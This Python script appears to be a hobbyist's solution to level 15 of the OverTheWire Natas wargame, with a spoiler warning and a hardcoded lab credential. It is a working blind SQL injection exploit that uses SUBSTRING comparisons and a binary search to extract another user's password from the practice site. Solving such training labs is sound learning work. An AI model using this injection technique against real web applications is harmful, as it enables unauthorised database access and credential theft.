#!/usr/bin/python3
"""

ALERT
please watch out this has spoilers if youre playing overthewire.org's natas
wargame and have interest in solving level 15 on your own.

Author: penal

"""

import requests as req
from urllib import parse

host = 'http://natas15.natas.labs.overthewire.org/index.php?username=natas16'

session = req.Session()
session.auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
auth = session.post(host)

def get_body(host: str, position: int, letter:str, sign: str = '>', upper: bool = False):
    # this basically does the sql injection part, blindly of course
    if upper:
        if sign!='=':
            print("warning, you're using get_body with upper set to true and sign not set to =, it will automatically be set to =.")
        p = parse.quote_plus(f'''" AND BINARY SUBSTRING((SELECT password FROM users WHERE username = 'natas16'), {str(position)}, 1) = BINARY UPPER('{letter}'); -- -''')
    else:
        p = parse.quote_plus(f'''" AND SUBSTRING((SELECT password FROM users WHERE username = 'natas16'), {str(position)}, 1) {sign}'{letter}'; -- -''')
    r = session.get(host+p)
    body = r.text
    return body


def exists_in(body: str):
    return 'This user exists.' in body

    

# this function has a very very descriptive name, i dont think it needs any
# more description, but ill do it anyway: it searches for password chars. there
# ya go
def a_dichotomic_search_for_a_lost_password_character(host: str, position: int, low_end: int, high_end: int):
    if abs(high_end - low_end) <= 1:
        if exists_in(get_body(host, position, chr(high_end), '=')):
            if (exists_in(get_body(host, position, chr(high_end), '=', upper=True))):
                print (f"found position = {position} letter = {chr(high_end).upper()}")
                return chr(high_end).upper()
            else:
                print (f"found position = {position} letter = {chr(high_end)}")
                return chr(high_end)
        elif exists_in(get_body(host, position, chr(low_end), '=')):
            if exists_in(get_body(host, position, chr(low_end), '=', upper=True)):
                print (f"found position = {position} letter = {chr(low_end).upper()}")
                return chr(low_end).upper()
            else:
                print (f"found position = {position} letter = {chr(low_end)}")
                return chr(low_end)
        else:
            for i in range(10):
                if (exists_in(get_body(host, position, str(i), '='))):
                    print(f"found position = {position} number = {str(i)}")
                    return str(i)
            
    letter = chr((low_end + high_end) // 2)
    body = get_body(host, position, letter)
    if exists_in(body):
        # sorry for the mumbo jumbo ord reverse thing but it just stands for chr^-1(letter) :)
        # whats faster a calculation or a function call
        # probably a calculation but whatever
        return a_dichotomic_search_for_a_lost_password_character(host, position, ord(letter), high_end)
    else:
        return a_dichotomic_search_for_a_lost_password_character(host, position, low_end, ord(letter))
        

password = ''
for position in range(1, 33):
    result = a_dichotomic_search_for_a_lost_password_character(host, position, ord('a'), ord('z'))
    password += result
    print(result)
print(password)

# hope this wasnt a bit of an overdo. fun is the name of the game
